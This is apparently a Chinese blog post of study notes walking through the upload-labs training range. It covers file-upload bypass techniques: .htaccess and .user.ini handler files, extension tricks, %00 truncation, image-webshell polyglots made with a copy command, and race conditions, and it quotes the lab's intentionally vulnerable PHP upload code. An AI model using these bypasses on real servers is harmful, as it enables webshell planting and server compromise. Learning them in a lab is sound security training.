{"title":"渗透测试笔记 - day24、25、26、27 文件上传","date":"2022-02-28T00:00:00.000Z","date_formatted":{"ll":"Feb 28, 2022","L":"02/28/2022","MM-DD":"02-28"},"link":"2022/02/28/渗透测试笔记 - day24、25、26、27 文件上传","updated":"2023-03-17T12:07:41.487Z","content":"<h2 id=\"upload-labs-pass-01-前端js限制绕过\">upload-labs pass-01 前端js限制绕过<a title=\"#upload-labs-pass-01-前端js限制绕过\" href=\"#upload-labs-pass-01-前端js限制绕过\"></a></h2>\n<p>火狐安装disables javascript插件，直接禁止js语句在前端运行。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112000503.png\" alt=\"image-20220302205818263\" loading=\"lazy\" class=\"φbp\"></p>\n<p>上传后门</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112000311.png\" alt=\"image-20220302205554714\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112000714.png\" alt=\"image-20220302205835082\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"upload-labs-pass-02-mime-type修改绕过\">upload-labs pass-02 Mime Type修改绕过<a title=\"#upload-labs-pass-02-mime-type修改绕过\" href=\"#upload-labs-pass-02-mime-type修改绕过\"></a></h2>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112000262.png\" alt=\"image-20220302185158899\" loading=\"lazy\" class=\"φbp\"></p>\n<p>前端上传后门，burp抓包</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112000369.png\" alt=\"image-20220302210012506\" loading=\"lazy\" class=\"φbp\"></p>\n<p>更改Conten-Type为image/jpeg</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112000666.png\" alt=\"image-20220302210050196\" loading=\"lazy\" class=\"φbp\"></p>\n<p>上传成功</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112000660.png\" alt=\"image-20220302210110130\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"upload-labs-pass-03-php3/4/5绕过\">upload-labs pass-03 php3/4/5绕过<a title=\"#upload-labs-pass-03-php3/4/5绕过\" href=\"#upload-labs-pass-03-php3/4/5绕过\"></a></h2>\n<p>需要靶场支持解析php4  php5等文件。</p>\n<p>（在配置httpd.conf文件里加入以下代码）</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">AddType application/x-https-php .php .phtml .php3 .php4 .php5 .phtml</span><br><span class=\"line\">    .asp .aspx .php .jsp</span><br></pre></td></tr></table></figure>\n<p>上传后缀名为php4的文件</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112000530.png\" alt=\"image-20220302210746805\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"upload-labs-pass-04-.htaccess绕过\">upload-labs pass-04 .htaccess绕过<a title=\"#upload-labs-pass-04-.htaccess绕过\" href=\"#upload-labs-pass-04-.htaccess绕过\"></a></h2>\n<p>.htaccess为apache的配置文件，其优先级高于httpd.conf。</p>\n<p>因此可以通过上传.htaccess文件修改apache的配置文件使得解析特定后缀名文件为php。</p>\n<p>注：.htaccess文件作用与为当前路径和子路径。</p>\n<p>再上传.jpg文件使其解析为php。</p>\n<p>编写.htaccess文件</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;FilesMatch <span class=\"string\">&quot;123.jpg&quot;</span>&gt;</span><br><span class=\"line\">SetHandler application/x-httpd-php</span><br><span class=\"line\">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>\n<p>上传.htaccess文件</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112000303.png\" alt=\"image-20220302211546470\" loading=\"lazy\" class=\"φbp\"></p>\n<p>上传123.jpg</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112000603.png\" alt=\"image-20220302211614295\" loading=\"lazy\" class=\"φbp\"></p>\n<p>完成。</p>\n<h2 id=\"upload-labs-pass-05-.user.ini绕过\">upload-labs pass-05 .user.ini绕过<a title=\"#upload-labs-pass-05-.user.ini绕过\" href=\"#upload-labs-pass-05-.user.ini绕过\"></a></h2>\n<p><strong>.user.ini</strong>为apache的配置文件，更新于php 5.3以后版本，需要开启FastCGI并且是Nginx环境。功能相当于php.ini却优先级高于php.ini。 能够包含指定文件显示在页面上，这其中有个潜规则：</p>\n<p>.user.ini(php.ini)包含的文件将被解析为php文件。</p>\n<p>作用域同.htaccess。</p>\n<p>.user.ini 文件编写如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">auto_prepend_file=phpinfo.jpg <span class=\"comment\">//在页面顶部显示</span></span><br><span class=\"line\">auto_append_file=phpinfo.jpg <span class=\"comment\">//在页面底部显示</span></span><br></pre></td></tr></table></figure>\n<p>上传.user.ini文件</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112000209.png\" alt=\"image-20220302211810897\" loading=\"lazy\" class=\"φbp\"></p>\n<p>上传123.jpg</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112000972.png\" alt=\"image-20220302211829880\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"upload-labs-pass-06-大小写绕过\">upload-labs pass-06 大小写绕过<a title=\"#upload-labs-pass-06-大小写绕过\" href=\"#upload-labs-pass-06-大小写绕过\"></a></h2>\n<p>windows下的大小写绕过（windows不区分大小写但是后端未过滤大小写）。</p>\n<p>linux下区分大小写，不可用此方法。</p>\n<p>更改文件后缀名为.Php</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112000702.png\" alt=\"image-20220302212332012\" loading=\"lazy\" class=\"φbp\"></p>\n<p>完成</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112000153.png\" alt=\"image-20220302213307918\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"upload-labs-pass-07-空格绕过\">upload-labs pass-07 空格绕过<a title=\"#upload-labs-pass-07-空格绕过\" href=\"#upload-labs-pass-07-空格绕过\"></a></h2>\n<p>windows可自行删除文件名内的空格，因此可通过收尾添加空格绕过文件名限制。</p>\n<p>前端上传后抓包</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112000518.png\" alt=\"image-20220302213856228\" loading=\"lazy\" class=\"φbp\"></p>\n<p>添加空格（%20）。</p>\n<p>完成。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112000618.png\" alt=\"image-20220302213912405\" loading=\"lazy\" class=\"φbp\"></p>\n<h1 id=\"hvv-day25-文件上传（2）\">hvv-day25 文件上传（2）<a title=\"#hvv-day25-文件上传（2）\" href=\"#hvv-day25-文件上传（2）\"></a></h1>\n<h2 id=\"php知识补充\">php知识补充<a title=\"#php知识补充\" href=\"#php知识补充\"></a></h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_ invoke__\">trim</span>(<span class=\"variable\">$a</span>(str)); <span class=\"comment\">//去除字符串a左右空格</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">ltrim</span>(<span class=\"variable\">$a</span>(str)); <span class=\"comment\">//去除字符串a左空格</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">rtrim</span>(<span class=\"variable\">$a</span>(str)); <span class=\"comment\">//去除字符串a右空格</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">strtolower</span>(<span class=\"variable\">$a</span>(str)); <span class=\"comment\">//将a字符串中的大写转小写</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">strrchr</span>(<span class=\"variable\">$a</span>,<span class=\"string\">&quot;abc&quot;</span>); <span class=\"comment\">//取指定字符串a中“abc”字符串之后的值</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">str_ireplace</span>(<span class=\"variable\">$a</span>,<span class=\"string\">&quot;abc&quot;</span>,<span class=\"string\">&quot;efg&quot;</span>); <span class=\"comment\">//查找a字符串中的abc字符串并替换为efg字符串</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">move_uploaded_file</span>(<span class=\"string\">&quot;file1&quot;</span>,<span class=\"string\">&quot;../file&quot;</span>); <span class=\"comment\">//将file1文件移至../file目录下</span></span><br><span class=\"line\"><span class=\"variable\">$_FILES</span>[name]; <span class=\"comment\">//返回表单提交过来的文件名</span></span><br><span class=\"line\"><span class=\"comment\">//[type] 文件类型</span></span><br><span class=\"line\"><span class=\"comment\">//[tmp-name] 文件临时存放路径 </span></span><br><span class=\"line\"><span class=\"comment\">//[error] 上传文件报错信息（上传成功返回空）</span></span><br><span class=\"line\"><span class=\"comment\">//[size] 上传文件大小</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"upload-labs-pass-08--::$data绕过\">upload-labs pass-08  ::$DATA绕过<a title=\"#upload-labs-pass-08--::$data绕过\" href=\"#upload-labs-pass-08--::$data绕过\"></a></h2>\n<p>Windows自动去除文件尾的::$DATA</p>\n<p>因此可以在文件后加::$DATA实现绕过</p>\n<p>上传，抓包</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112000688.png\" alt=\"image-20220303225330099\" loading=\"lazy\" class=\"φbp\"></p>\n<p>后缀加::$DATA</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112000817.png\" alt=\"image-20220303225406209\" loading=\"lazy\" class=\"φbp\"></p>\n<p>上传</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112000301.png\" alt=\"image-20220303225514284\" loading=\"lazy\" class=\"φbp\"></p>\n<p>完成。</p>\n<h2 id=\"upload-labs-pass-09-&quot;.-.&quot;-绕过\">upload-labs pass-09 “. .” 绕过<a title=\"#upload-labs-pass-09-&quot;.-.&quot;-绕过\" href=\"#upload-labs-pass-09-&quot;.-.&quot;-绕过\"></a></h2>\n<p>windows不允许最后后缀名为.</p>\n<p>因此可以使用&quot;.&quot;绕过</p>\n<p>上传，抓包</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112000986.png\" alt=\"image-20220303223153441\" loading=\"lazy\" class=\"φbp\"></p>\n<p>修改为：123.php.</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112000080.png\" alt=\"image-20220303223306291\" loading=\"lazy\" class=\"φbp\"></p>\n<p>上传成功。</p>\n<h1 id=\"hvv-day26-文件上传（3）\">hvv-day26 文件上传（3）<a title=\"#hvv-day26-文件上传（3）\" href=\"#hvv-day26-文件上传（3）\"></a></h1>\n<h2 id=\"upload-labs-pass-10-\t双写绕过\">upload-labs pass-10 \t双写绕过<a title=\"#upload-labs-pass-10-\t双写绕过\" href=\"#upload-labs-pass-10-\t双写绕过\"></a></h2>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112000213.png\" alt=\"image-20220303225838787\" loading=\"lazy\" class=\"φbp\"></p>\n<p>这里可以看到将 $dent_ext 保存的字符数组里的所有黑名单后缀名全做了替换为空处理。因此双写成如phphpp后，替换掉黑名单就还剩php。可以使用这种方法绕过。</p>\n<p>直接改文件名上传。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112000924.png\" alt=\"image-20220303230211043\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112000523.png\" alt=\"image-20220304190957065\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112000094.png\" alt=\"image-20220304191028845\" loading=\"lazy\" class=\"φbp\"></p>\n<p>上传成功。</p>\n<h2 id=\"upload-labs-pass-11\t$_get-的%00截断\">upload-labs pass-11\t$_GET 的%00截断<a title=\"#upload-labs-pass-11\t$_get-的%00截断\" href=\"#upload-labs-pass-11\t$_get-的%00截断\"></a></h2>\n<p>数据包解析时，遇到%00（0x0000）会截断，解析下一段。可以使用这个方法绕过后缀名白名单。</p>\n<p><strong>使用前提：</strong></p>\n<ul>\n<li>php版本 小于5.3.4</li>\n<li>php的 magic_quotes_gpc 为 OFF状态 这函数是魔术引号，会对敏感的字符转义的 空就会被转义加个反斜杠</li>\n</ul>\n<p>上传抓包。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112000497.png\" alt=\"image-20220304212426985\" loading=\"lazy\" class=\"φbp\"></p>\n<p>修改路径并截断。修改文件名。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112001511.png\" alt=\"image-20220304212511459\" loading=\"lazy\" class=\"φbp\"></p>\n<p>上传成功。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112001665.png\" alt=\"image-20220304190957065\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112001301.png\" alt=\"image-20220304191028845\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"upload-labs-pass-12\t$_post的%00截断\">upload-labs pass-12\t$_POST的%00截断<a title=\"#upload-labs-pass-12\t$_post的%00截断\" href=\"#upload-labs-pass-12\t$_post的%00截断\"></a></h2>\n<p>同上关。上传抓包。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112001041.png\" alt=\"image-20220304214609393\" loading=\"lazy\" class=\"φbp\"></p>\n<p>修改路径最后Hex值为0000</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112001683.png\" alt=\"image-20220304214803008\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112001534.png\" alt=\"image-20220304214857043\" loading=\"lazy\" class=\"φbp\"></p>\n<p>上传成功</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112001584.png\" alt=\"image-20220304190957065\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112001911.png\" alt=\"image-20220304191028845\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"upload-labs-pass-13\t图片马\">upload-labs pass-13\t图片马<a title=\"#upload-labs-pass-13\t图片马\" href=\"#upload-labs-pass-13\t图片马\"></a></h2>\n<p>后台检查文件编码格式是否符合要求时，可以制作图片马绕过。</p>\n<p>制作图片马。</p>\n<p>添加gif文件标识头</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112001421.png\" alt=\"image-20220304220053741\" loading=\"lazy\" class=\"φbp\"></p>\n<p>上传</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112001743.png\" alt=\"image-20220304220136340\" loading=\"lazy\" class=\"φbp\"></p>\n<p>完成。</p>\n<h2 id=\"upload-labs-pass-14\t图片马\">upload-labs pass-14\t图片马<a title=\"#upload-labs-pass-14\t图片马\" href=\"#upload-labs-pass-14\t图片马\"></a></h2>\n<p>直接上传即可</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112001249.png\" alt=\"image-20220304220615494\" loading=\"lazy\" class=\"φbp\"></p>\n<h1 id=\"hvv-day27-文件上传（4）\">hvv-day27 文件上传（4）<a title=\"#hvv-day27-文件上传（4）\" href=\"#hvv-day27-文件上传（4）\"></a></h1>\n<h2 id=\"upload-labs-pass-15\t使用copy制作图片马\">upload-labs pass-15\t使用copy制作图片马<a title=\"#upload-labs-pass-15\t使用copy制作图片马\" href=\"#upload-labs-pass-15\t使用copy制作图片马\"></a></h2>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">copy 1.jpg /b + info.php /a 1.jpg </span><br></pre></td></tr></table></figure>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112001058.png\" alt=\"image-20220307210501393\" loading=\"lazy\" class=\"φbp\"></p>\n<p>上传。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112001492.png\" alt=\"image-20220307210532246\" loading=\"lazy\" class=\"φbp\"></p>\n<p>完成。</p>\n<h2 id=\"upload-labs-pass-16\t渲染绕过\">upload-labs pass-16\t渲染绕过<a title=\"#upload-labs-pass-16\t渲染绕过\" href=\"#upload-labs-pass-16\t渲染绕过\"></a></h2>\n<p>服务器使用imagecreatefromjpeg函数重新渲染上传后的图片，这里可以使用脚本比对渲染前后的图片改动位置来制作图片马。详见<a href=\"https://secgeek.net/bookfresh-vulnerability/\" target=\"_blank\">大牛博客</a>这里不做过多介绍。</p>\n<h2 id=\"upload-labs-pass-17\t条件竞争\">upload-labs pass-17\t条件竞争<a title=\"#upload-labs-pass-17\t条件竞争\" href=\"#upload-labs-pass-17\t条件竞争\"></a></h2>\n<p>代码审计：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$ext_arr</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;jpg&#x27;</span>,<span class=\"string\">&#x27;png&#x27;</span>,<span class=\"string\">&#x27;gif&#x27;</span>);\t\t\t<span class=\"comment\">//定义白名单</span></span><br><span class=\"line\">    <span class=\"variable\">$file_name</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>];\t\t</span><br><span class=\"line\">    <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$file_ext</span> = <span class=\"title function_ invoke__\">substr</span>(<span class=\"variable\">$file_name</span>,<span class=\"title function_ invoke__\">strrpos</span>(<span class=\"variable\">$file_name</span>,<span class=\"string\">&quot;.&quot;</span>)+<span class=\"number\">1</span>);\t\t<span class=\"comment\">//获取后缀名</span></span><br><span class=\"line\">    <span class=\"variable\">$upload_file</span> = UPLOAD_PATH . <span class=\"string\">&#x27;/&#x27;</span> . <span class=\"variable\">$file_name</span>;\t\t\t\t\t<span class=\"comment\">//上传文件</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">move_uploaded_file</span>(<span class=\"variable\">$temp_file</span>, <span class=\"variable\">$upload_file</span>))&#123;\t\t\t\t<span class=\"comment\">//文件后缀检查并重命名</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$file_ext</span>,<span class=\"variable\">$ext_arr</span>))&#123;</span><br><span class=\"line\">             <span class=\"variable\">$img_path</span> = UPLOAD_PATH . <span class=\"string\">&#x27;/&#x27;</span>. <span class=\"title function_ invoke__\">rand</span>(<span class=\"number\">10</span>, <span class=\"number\">99</span>).<span class=\"title function_ invoke__\">date</span>(<span class=\"string\">&quot;YmdHis&quot;</span>).<span class=\"string\">&quot;.&quot;</span>.<span class=\"variable\">$file_ext</span>;</span><br><span class=\"line\">             <span class=\"title function_ invoke__\">rename</span>(<span class=\"variable\">$upload_file</span>, <span class=\"variable\">$img_path</span>);</span><br><span class=\"line\">             <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">unlink</span>(<span class=\"variable\">$upload_file</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里可以看到服务器是先上传了文件再做的文件检查。于是构造思路可以通过不断发包使得文件名更改前的短暂停留变成可以访问。</p>\n<p>上传，burp抓包。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112001258.png\" alt=\"image-20220307212949868\" loading=\"lazy\" class=\"φbp\"></p>\n<p>使用intruder模块不断发包。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112001418.png\" alt=\"image-20220307213239973\" loading=\"lazy\" class=\"φbp\"></p>\n<p>访问</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112001571.png\" alt=\"image-20220307213357981\" loading=\"lazy\" class=\"φbp\"></p>\n<p>社区版，线程数太少了。就这样吧。。</p>\n<h2 id=\"upload-labs-pass-18\tapache解析漏洞\">upload-labs pass-18\tapache解析漏洞<a title=\"#upload-labs-pass-18\tapache解析漏洞\" href=\"#upload-labs-pass-18\tapache解析漏洞\"></a></h2>\n<p>当apache解析文件后缀名时，将从右往左解析，遇到无法解析后缀名时将略过。因此可使用1.php.jpg的方式绕过白名单限制。</p>\n<p>而文件上传后同样会被重命名，因此需要结合条件竞争手法绕过。</p>\n<p>上传并抓包。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112001269.png\" alt=\"image-20220307214925292\" loading=\"lazy\" class=\"φbp\"></p>\n<p>使用intruder模块重复发包。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112001066.png\" alt=\"image-20220307215032780\" loading=\"lazy\" class=\"φbp\"></p>\n<p>线程太少了，竞争不了。就这样吧。。</p>\n<h2 id=\"upload-labs-pass-19\t.-.绕过\">upload-labs pass-19\t. .绕过<a title=\"#upload-labs-pass-19\t.-.绕过\" href=\"#upload-labs-pass-19\t.-.绕过\"></a></h2>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112001209.png\" alt=\"image-20220307215231144\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"upload-labs-pass-20\t数组构造上传绕过\">upload-labs pass-20\t数组构造上传绕过<a title=\"#upload-labs-pass-20\t数组构造上传绕过\" href=\"#upload-labs-pass-20\t数组构造上传绕过\"></a></h2>\n<p>代码审计：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"comment\">//检查MIME</span></span><br><span class=\"line\">    <span class=\"variable\">$allow_type</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;image/jpeg&#x27;</span>,<span class=\"string\">&#x27;image/png&#x27;</span>,<span class=\"string\">&#x27;image/gif&#x27;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;type&#x27;</span>],<span class=\"variable\">$allow_type</span>))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//检查文件名</span></span><br><span class=\"line\">        <span class=\"variable\">$file</span> = <span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;save_name&#x27;</span>]) ? <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>] : <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;save_name&#x27;</span>]; </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">is_array</span>(<span class=\"variable\">$file</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$file</span> = <span class=\"title function_ invoke__\">explode</span>(<span class=\"string\">&#x27;.&#x27;</span>, <span class=\"title function_ invoke__\">strtolower</span>(<span class=\"variable\">$file</span>)); \t\t\t <span class=\"comment\">//将文件名以.为分隔存入字符数组</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">        <span class=\"variable\">$ext</span> = <span class=\"title function_ invoke__\">end</span>(<span class=\"variable\">$file</span>);\t\t\t\t\t\t\t\t\t<span class=\"comment\">//获取数组最后一串字符</span></span><br><span class=\"line\">        <span class=\"variable\">$allow_suffix</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;jpg&#x27;</span>,<span class=\"string\">&#x27;png&#x27;</span>,<span class=\"string\">&#x27;gif&#x27;</span>);\t\t\t<span class=\"comment\">//白名单</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$ext</span>, <span class=\"variable\">$allow_suffix</span>)) &#123;\t\t\t\t<span class=\"comment\">//验证白名单</span></span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"variable\">$file_name</span> = <span class=\"title function_ invoke__\">reset</span>(<span class=\"variable\">$file</span>) . <span class=\"string\">&#x27;.&#x27;</span> . <span class=\"variable\">$file</span>[<span class=\"title function_ invoke__\">count</span>(<span class=\"variable\">$file</span>) - <span class=\"number\">1</span>];\t\t<span class=\"comment\">//将$file的第一个字符串与$file[count($file) - 1]字符串拼接（同  $file[0]+end($file)）</span></span><br><span class=\"line\">            <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable\">$img_path</span> = UPLOAD_PATH . <span class=\"string\">&#x27;/&#x27;</span> .<span class=\"variable\">$file_name</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">move_uploaded_file</span>(<span class=\"variable\">$temp_file</span>, <span class=\"variable\">$img_path</span>)) &#123;\t\t<span class=\"comment\">//上传</span></span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;文件上传成功！&quot;</span>;</span><br><span class=\"line\">                <span 